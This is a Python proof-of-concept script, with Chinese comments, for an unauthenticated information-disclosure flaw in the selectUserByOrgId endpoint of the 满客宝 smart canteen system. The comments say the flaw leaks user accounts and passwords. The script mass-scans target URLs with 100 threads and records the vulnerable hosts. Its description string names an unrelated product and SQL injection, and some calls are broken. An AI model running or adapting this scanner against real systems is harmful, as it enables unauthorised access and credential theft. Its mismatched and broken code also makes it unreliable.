#满客宝智慧食堂系统 selectUserByOrgId 接口处未进行权限控制，
#导致未经身份验证的远程攻击者可以未授权访问，泄露系统用户账号密码等信息.
import requests,sys,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help="Please input -h")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for url in fp.readlines():
                lis.append(url.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join

    # print("Usage：python "+sys.argv[0]+' -h')



def poc(target):
    payload = '/yuding/selectUserByOrgId.action?record='
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    try:
        res1 = requests.get(url = target+payload,headers=headers,timeout=5,verify=False)
        if '217918FE714E' in res1.text:
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()